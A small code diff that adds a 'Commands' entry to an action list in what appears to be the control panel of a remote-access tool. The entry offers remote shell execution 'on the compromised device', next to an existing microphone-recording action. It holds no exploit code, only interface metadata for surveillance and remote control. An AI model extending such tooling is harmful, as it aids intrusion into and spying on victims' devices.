@@ -20,4 +20,11 @@ export const actions = [
       "Record and retrieve audio from the remote device's microphone for investigation or documentation.",
     icon: "bi-mic",
   },
+  {
+    title: "Commands",
+    action: "commands",
+    description:
+      "Execute custom shell or terminal commands remotely on the compromised device for advanced diagnostics or control.",
+    icon: "bi-terminal",
+  },
 ];
